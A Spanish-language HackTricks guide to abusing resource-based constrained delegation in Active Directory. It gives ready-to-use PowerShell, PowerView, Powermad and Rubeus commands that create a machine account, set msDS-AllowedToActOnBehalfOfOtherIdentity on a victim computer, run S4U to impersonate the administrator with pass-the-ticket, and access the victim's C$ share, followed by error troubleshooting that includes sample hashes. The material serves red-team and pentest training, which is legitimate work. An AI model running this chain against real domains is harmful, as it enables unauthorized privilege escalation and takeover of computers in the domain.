# Delegación Constrain Basada en Recursos

{{#include ../../banners/hacktricks-training.md}}


## Conceptos Básicos de la Delegación Constrain Basada en Recursos

Esto es similar a la [Delegación Constrain](constrained-delegation.md) básica pero **en lugar** de dar permisos a un **objeto** para **suplantar a cualquier usuario contra un servicio**. La Delegación Constrain Basada en Recursos **establece** en **el objeto quién puede suplantar a cualquier usuario contra él**.

En este caso, el objeto restringido tendrá un atributo llamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con el nombre del usuario que puede suplantar a cualquier otro usuario contra él.

Otra diferencia importante de esta Delegación Constrain con respecto a las otras delegaciones es que cualquier usuario con **permisos de escritura sobre una cuenta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede establecer el _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (En las otras formas de Delegación necesitabas privilegios de administrador de dominio).

### Nuevos Conceptos

En la Delegación Constrain se mencionó que el **`TrustedToAuthForDelegation`** flag dentro del valor _userAccountControl_ del usuario es necesario para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **servicio** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** ese flag el TGS devuelto **no será** **Forwardable**.

Sin embargo, si el **TGS** utilizado en **S4U2Proxy** **NO es Forwardable**, intentar abusar de una **delegación Constrain básica** **no funcionará**. Pero si estás tratando de explotar una **delegación Constrain basada en recursos, funcionará** (esto no es una vulnerabilidad, es una característica, aparentemente).

### Estructura del Ataque

> Si tienes **privilegios equivalentes de escritura** sobre una cuenta de **Computadora**, puedes obtener **acceso privilegiado** en esa máquina.

Supongamos que el atacante ya tiene **privilegios equivalentes de escritura sobre la computadora víctima**.

1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea uno** (“Servicio A”). Ten en cuenta que **cualquier** _Usuario Administrador_ sin ningún otro privilegio especial puede **crear** hasta 10 **objetos de Computadora (**_**MachineAccountQuota**_**)** y establecerles un **SPN**. Así que el atacante puede simplemente crear un objeto de Computadora y establecer un SPN.
2. El atacante **abusa de su privilegio de ESCRITURA** sobre la computadora víctima (ServicioB) para configurar **delegación constrain basada en recursos para permitir que ServicioA suplantar a cualquier usuario** contra esa computadora víctima (ServicioB).
3. El atacante utiliza Rubeus para realizar un **ataque S4U completo** (S4U2Self y S4U2Proxy) desde Servicio A a Servicio B para un usuario **con acceso privilegiado a Servicio B**.
1. S4U2Self (desde la cuenta SPN comprometida/creada): Solicitar un **TGS de Administrador para mí** (No Forwardable).
2. S4U2Proxy: Usar el **TGS no Forwardable** del paso anterior para solicitar un **TGS** de **Administrador** para el **host víctima**.
3. Incluso si estás usando un TGS no Forwardable, como estás explotando la delegación constrain basada en recursos, funcionará.
4. El atacante puede **pasar el ticket** y **suplantar** al usuario para obtener **acceso al ServicioB víctima**.

Para verificar el _**MachineAccountQuota**_ del dominio puedes usar:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Ataque

### Creando un Objeto de Computadora

Puedes crear un objeto de computadora dentro del dominio usando [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configuración de R**esource-based Constrained Delegation**

**Usando el módulo de PowerShell de activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Usando powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Realizando un ataque S4U completo

Primero que nada, creamos el nuevo objeto de Computadora con la contraseña `123456`, así que necesitamos el hash de esa contraseña:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Esto imprimirá los hashes RC4 y AES para esa cuenta.\
Ahora, se puede realizar el ataque:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puedes generar más tickets solo pidiendo una vez usando el parámetro `/altservice` de Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Tenga en cuenta que los usuarios tienen un atributo llamado "**No se puede delegar**". Si un usuario tiene este atributo en Verdadero, no podrá impersonarlo. Esta propiedad se puede ver dentro de bloodhound.

### Accediendo

La última línea de comando realizará el **ataque S4U completo e inyectará el TGS** desde Administrator al host víctima en **memoria**.\
En este ejemplo se solicitó un TGS para el servicio **CIFS** desde Administrator, por lo que podrá acceder a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuso de diferentes tickets de servicio

Aprende sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#available-services).

## Errores de Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que Kerberos está configurado para no usar DES o RC4 y solo estás proporcionando el hash RC4. Proporciona a Rubeus al menos el hash AES256 (o simplemente proporciónale los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora de la computadora actual es diferente de la del DC y Kerberos no está funcionando correctamente.
- **`preauth_failed`**: Esto significa que el nombre de usuario + hashes dados no están funcionando para iniciar sesión. Puede que hayas olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Esto puede significar:
  - El usuario que intentas suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
  - El servicio solicitado no existe (si pides un ticket para winrm pero winrm no está en ejecución)
  - La computadora falsa creada ha perdido sus privilegios sobre el servidor vulnerable y necesitas devolvérselos.

## Referencias

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

{{#include ../../banners/hacktricks-training.md}}
